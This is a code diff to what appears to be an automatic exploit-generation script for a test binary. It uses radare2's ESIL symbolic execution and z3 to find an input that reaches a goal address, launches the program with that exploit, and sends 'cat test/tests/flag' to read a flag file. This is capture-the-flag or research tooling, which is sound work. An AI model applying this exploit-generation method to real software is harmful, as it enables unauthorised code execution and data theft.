@@ -13,12 +13,11 @@ import r2pipe
 
 context.arch = 'amd64'
 
-path = "tests/aeg_program"
+path = "test/tests/aeg_program"
 r2p = None
 
 def esilsolve_execution(targets):
     log.info("Starting esilsolve execution...")
-    start = time.time()
 
     r2p.cmd("s %d; aei; aeim;" % targets["check_start"])
     esilsolver = ESILSolver(r2p, debug=False, trace=False)
@@ -29,25 +28,22 @@ def esilsolve_execution(targets):
     b = [z3.BitVec("b%d" % x, 8) for x in range(buf_len)]
     buf = z3.Concat(*b)
 
-    state.memory[buf_addr] = buf
+    state.memory[buf_addr] = b[::-1]
 
     def constrain_jump(newstate):
         # never take jumps for failed solutions
         newstate.constrain(newstate.registers["zf"] == 1) 
 
-    for jne_addr in targets["jnes"]:
-        esilsolver.register_hook(jne_addr, constrain_jump)
+    #for jne_addr in targets["jnes"]:
+    #    esilsolver.register_hook(jne_addr, constrain_jump)
 
     avoid_addr = targets["check_start"]+39
+    start = time.time()
     final = esilsolver.run(targets["goal"], avoid=[avoid_addr])
-    
-    if final.solver.check() == z3.sat:
-        end = time.time()
-        log.info("EXEC TIME: %f" % (end-start))
 
-        return list(final.evaluate_buffer(buf))
-    else:
-        return []
+    log.info("EXEC TIME: %f" % (time.time()-start))
+    
+    return list(final.evaluate_buffer(buf))
 
 def generate_exploit(magic, targets, elf):
 
@@ -189,7 +185,7 @@ if __name__ == "__main__":
     x = process([path, exploit])
     x.read()
     #time.sleep(0.1)
-    x.writeline("cat tests/flag")
+    x.writeline("cat test/tests/flag")
     log.info("FLAG: %s" % x.read().decode())
 
     '''f.read()
